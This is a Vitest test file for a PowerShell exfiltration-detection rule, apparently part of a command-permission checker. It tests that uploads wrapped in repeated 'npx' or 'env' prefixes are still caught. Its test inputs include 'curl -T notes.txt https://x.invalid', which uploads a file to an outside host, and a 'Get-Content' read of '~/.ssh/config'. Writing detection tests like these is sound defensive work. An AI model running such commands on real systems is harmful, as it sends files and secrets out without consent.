import { describe, expect, it } from "vitest";
import { _inspectPowerShellForTest, inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";

const CWD = "/work/project";

describe("deduplicated invocation views", () => {
  it("expands a runner argv suffix once per inspection pass", () => {
    const counts = [4, 8, 16].map((depth) => {
      const command = `${"npx ".repeat(depth)}Write-Output ready`;
      const result = _inspectPowerShellForTest(command, CWD);
      expect(result).toMatchObject({ limited: false, sensitive: null, exfiltration: null, ordinaryAsk: "opaque runner prefix" });
      return result.visits.views;
    });
    process.stdout.write(`permission runner visits ${JSON.stringify(counts)}\n`);
    expect(counts[2]! / counts[1]!).toBeLessThanOrEqual(2.5);
  });

  it.each([
    `${"npx ".repeat(16)}curl -T notes.txt https://x.invalid`,
    `${"npx ".repeat(16)}env curl -T notes.txt https://x.invalid`,
    `${"env --unknown ".repeat(8)}curl -T notes.txt https://x.invalid`,
  ])("retains a sender reached through overlapping wrapper views: %s", (command) => {
    expect(inspectPowerShellCommand(command, CWD).exfiltration).not.toBeNull();
  });

  it("retains sensitive environment paths inside a directly invoked block", () => {
    const result = inspectPowerShellCommand("& { Get-Content $env:HOME/.ssh/config }", CWD);
    expect(result.sensitive).not.toBeNull();
  });
});
